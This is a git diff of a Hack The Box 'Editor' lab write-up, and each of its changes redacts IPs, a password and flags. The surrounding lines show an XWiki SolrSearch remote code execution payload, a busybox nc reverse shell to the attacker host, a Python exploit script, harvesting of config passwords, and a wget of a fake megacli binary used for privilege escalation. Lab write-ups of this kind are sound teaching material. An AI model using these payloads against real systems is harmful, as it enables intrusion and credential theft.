@@ -17,10 +17,10 @@ Author: [kavigihan](https://app.hackthebox.com/users/389926) & [TheCyberGeek](ht
 ## Enumeration
 ### Nmap
 ```bash
-└─$ sudo nmap -Pn -sC -sV 10.129.254.56
+└─$ sudo nmap -Pn -sC -sV 10.129.xx.xx
 [sudo] password for kali: 
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 06:14 EDT
-Nmap scan report for 10.129.254.56
+Nmap scan report for 10.129.xx.xx
 Host is up (0.48s latency).
 Not shown: 997 closed tcp ports (reset)
 PORT     STATE SERVICE VERSION
@@ -33,7 +33,7 @@ PORT     STATE SERVICE VERSION
 |_http-title: Did not follow redirect to http://editor.htb/
 8080/tcp open  http    Jetty 10.0.20
 | http-title: XWiki - Main - Intro
-|_Requested resource was http://10.129.254.56:8080/xwiki/bin/view/Main/
+|_Requested resource was http://10.129.xx.xx:8080/xwiki/bin/view/Main/
 | http-cookie-flags: 
 |   /: 
 |     JSESSIONID: 
@@ -61,7 +61,7 @@ Nmap done: 1 IP address (1 host up) scanned in 36.01 seconds
 
 Add these to `/etc/hosts` file:
 ```bash
-10.129.254.56     editor.htb
+10.129.xx.xx     editor.htb
 ```
 
 So this machine got port `80` and `8080` open. Gonna check these out.
@@ -79,7 +79,7 @@ When we scroll down, saw some *Quick Links* section. Then hover to **Documentati
 &rarr; Add `wiki.editor.htb` to `/etc/hosts` file.
 
 ```bash
-10.129.254.56     editor.htb wiki.editor.htb
+10.129.xx.xx     editor.htb wiki.editor.htb
 ```
 
 Let's check out the `http://wiki.editor.htb/xwiki/`.
@@ -92,7 +92,7 @@ So we had go through port `80`, let's check for port `8080`. But if we recognize
 ```bash
 8080/tcp open  http    Jetty 10.0.20
 | http-title: XWiki - Main - Intro
-|_Requested resource was http://10.129.254.56:8080/xwiki/bin/view/Main/
+|_Requested resource was http://10.129.xx.xx:8080/xwiki/bin/view/Main/
 ```
 
 ![editor](/assets/img/editor-htb-season8/editor-htb-season8_xwiki_page.png)
@@ -148,7 +148,7 @@ http://wiki.editor.htb:80/xwiki/bin/view/Main/SolrSearch?text=%7D%7D%7D%7B%7Basy
 ![editor](/assets/img/editor-htb-season8/editor-htb-season8_xwiki_rce.png)
 
 So to able to get the reverse shell, we need to modified the payload `cat /etc/passwd`. <br>
-We gonna change to `busybox nc 10.10.16.31 3333 -e /bin/sh` and get the reverse shell.
+We gonna change to `busybox nc 10.xx.xx.xx 3333 -e /bin/sh` and get the reverse shell.
 
 The reason why using [busybox](https://gtfobins.github.io/gtfobins/busybox/) instead of `nc`: <br>
 - Single executable containing implementations of many common Unix utilities
@@ -162,7 +162,7 @@ Now start the listener in our kali machine, we gonna use `penelope -p 3333` to g
 
 ```bash
 └─$ penelope -p 3333
-[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.10.16.31
+[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.xx.xx.xx
 - 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 ```
 
@@ -172,14 +172,14 @@ After change the payload, we need to click the click in order to trigger the pro
 
 ```bash
 └─$ penelope -p 3333
-[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xxx.xx.xx • 172.xx.xx.xx • 10.10.16.31
+[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xxx.xx.xx • 172.xx.xx.xx • 10.xx.xx.xx
 - 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
-[+] Got reverse shell from editor~10.129.254.78-Linux-x86_64 😍 Assigned SessionID <1>
+[+] Got reverse shell from editor~10.129.xx.xx-Linux-x86_64 😍 Assigned SessionID <1>
 [+] Attempting to upgrade shell to PTY...
-[+] Got reverse shell from editor~10.129.254.78-Linux-x86_64 😍 Assigned SessionID <2>
+[+] Got reverse shell from editor~10.129.xx.xx-Linux-x86_64 😍 Assigned SessionID <2>
 [+] Shell upgraded successfully using /usr/bin/python3! 💪
 [+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
-[+] Logging to /home/kali/.penelope/editor~10.129.254.78-Linux-x86_64/2025_08_03-23_06_47-487.log 📜
+[+] Logging to /home/kali/.penelope/editor~10.129.xx.xx-Linux-x86_64/2025_08_03-23_06_47-487.log 📜
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 xwiki@editor:/usr/lib/xwiki-jetty$
 ```
@@ -240,7 +240,7 @@ if __name__ == "__main__":
     print("=" * 80)
     
     target = "editor.htb:8080/xwiki"
-    lhost = "10.10.16.31"  # Change this to attacker ip
+    lhost = "10.xx.xx.xx"  # Change this to attacker ip
     lport = "3333"
     
     target_url = detect_protocol(target)
@@ -255,7 +255,7 @@ XWiki CVE-2024-31982 - Direct Reverse Shell via BusyBox
 ================================================================================
 [!] HTTPS not available. Falling back to HTTP.
 [✔] HTTP available: http://editor.htb:8080/xwiki
-[+] Sending direct reverse shell via busybox to 10.10.16.31:3333 ...
+[+] Sending direct reverse shell via busybox to 10.xx.xx.xx:3333 ...
 [✔] Payload sent. Check your listener.
 ```
 
@@ -325,7 +325,7 @@ lrwxrwxrwx 1 root root     27 Mar 27  2024 xwiki.properties -> /etc/xwiki/xwiki.
 
 ```bash
 xwiki@editor:/usr/lib/xwiki/WEB-INF$ cat hibernate.cfg.xml | grep -i password
-    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
+    <property name="hibernate.connection.password">theEd1t0rTeamxx</property>
     <property name="hibernate.connection.password">xwiki</property>
     <property name="hibernate.connection.password">xwiki</property>
     <property name="hibernate.connection.password"></property>
@@ -334,7 +334,7 @@ xwiki@editor:/usr/lib/xwiki/WEB-INF$ cat hibernate.cfg.xml | grep -i password
     <property name="hibernate.connection.password"></property>
 ```
 
-Got the credentials `theEd1t0rTeam99` and `xwiki`. <br>
+Got the credentials `theEd1t0rTeamxx` and `xwiki`. <br>
 &rarr; Gonna try to `ssh` to `oliver` user.
 
 ```bash
@@ -351,7 +351,7 @@ drwx------ 2 oliver oliver 4096 Jul  8 08:34 .cache
 -rw-r--r-- 1 oliver oliver  807 Jun 13 09:45 .profile
 -rw-r----- 1 root   oliver   33 Aug  3 09:30 user.txt
 oliver@editor:~$ cat user.txt
-e0745394ba3b705dc26de4aac8838399
+e07453xxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 Nailed the `oliver` user and got the `user.txt` flag as well.
@@ -504,7 +504,7 @@ On the target machine, we gonna make a `/fakebin` directory and place the `megac
 
 ```bash
 oliver@editor:~$ mkdir -p ~/fakebin
-oliver@editor:~$ wget http://10.10.16.31/megacli -O ~/fakebin/megacli
+oliver@editor:~$ wget http://10.xx.xx.xx/megacli -O ~/fakebin/megacli
 oliver@editor:~$ chmod +x ~/fakebin/megacli
 ```
 
@@ -547,7 +547,7 @@ drwx------  2 root root 4096 Jun 19 11:30 .ssh
 drwxr-xr-x  2 root root 4096 Jun 19 08:14 scripts
 drwx------  3 root root 4096 Apr 27  2023 snap
 root@editor:/root# cat root.txt
-8aa9be1eb649248376cd54fc5c98c43d
+8aa9bexxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 Ta-da! Got the `root.txt` flag.
